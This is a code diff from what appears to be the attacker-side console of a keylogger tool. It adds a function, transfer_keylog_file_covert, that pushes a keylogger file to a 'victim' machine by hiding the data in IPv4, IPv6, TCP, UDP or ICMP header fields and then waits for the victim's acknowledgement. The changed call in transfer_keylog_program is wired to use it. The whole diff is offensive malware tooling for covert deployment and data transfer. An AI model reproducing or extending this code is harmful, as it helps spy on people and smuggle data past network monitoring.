@@ -253,7 +253,7 @@ def transfer_keylog_program(sock: socket.socket, dest_ip: str,
     # Initiate transfer of keylog file
     if ack == constants.RECEIVED_CONFIRMATION_MSG:
         print(constants.KEYLOGGER_FILE_ENTER_TIP)
-        res = transfer_file_covert(sock, dest_ip, dest_port, "", source_port, choices)
+        res = transfer_keylog_file_covert(sock, dest_ip, dest_port, source_port, choices)
 
         if res == constants.FILE_DNE:
             sock.send((constants.FILE_DNE + "/" + constants.FILE_DNE + "/" + constants.FILE_DNE).encode())
@@ -3929,6 +3929,83 @@ def find_specific_client_socket(client_dict: dict,
     except ValueError as e:
         print(constants.INVALID_INPUT_ERROR.format(e))
         return None, None, None, None, None
+
+
+def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
+                                source_port: int, choices: tuple):
+    # Initialize map
+    header_field_function_map = __get_protocol_header_transfer_function_map()
+
+    # Get User Input for File + Check if Exists
+    file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))
+
+    # Check if the file exists
+    if os.path.exists(file_path):
+        print(constants.TRANSFER_FILE_FOUND_MSG.format(file_path))
+        print(constants.TRANSFER_FILE_INIT_MSG.format(file_path))
+
+        # Parse File Name
+        parsed_file_path = file_path.split("/")
+        file_name = parsed_file_path[-1]
+
+        # Send file name and choices
+        sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())
+
+        # Find the choice(header/field) in map, get and call the mapped function
+        if choices in header_field_function_map:
+            selected_function = header_field_function_map.get(choices)
+
+            # DIFFERENT HANDLERS: IPv4
+            if constants.IPV4 in choices:
+                if constants.SOURCE_ADDRESS_FIELD in choices:
+                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+                elif selected_function is not None and callable(selected_function):
+                    selected_function(sock, dest_ip, file_path)
+
+            # DIFFERENT HANDLERS: IPv6
+            elif constants.IPV6 in choices:
+                if constants.DESTINATION_ADDRESS_FIELD in choices:
+                    __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+                    return None
+
+                # Get victim IPv6 address and port
+                dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
+                selected_function(sock, dest_ip, dest_port, file_path)
+
+            # DIFFERENT HANDLERS: TCP or UDP
+            elif constants.TCP in choices or constants.UDP in choices:
+                selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+            # DIFFERENT HANDLERS: ICMP
+            elif constants.ICMP in choices:
+                selected_function(sock, dest_ip, file_path)
+
+            else:
+                print(constants.CALL_MAP_FUNCTION_ERROR)
+                return None
+        else:
+            print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
+            return None
+
+        # Get an ACK from the victim for success
+        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
+
+        if transfer_result == constants.VICTIM_ACK:
+            print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
+                                                            dest_ip,
+                                                            dest_port))
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+        else:
+            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+    else:
+        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return constants.FILE_DNE
 
 
 def perform_menu_item_3(client_dict: dict, source_port: int):
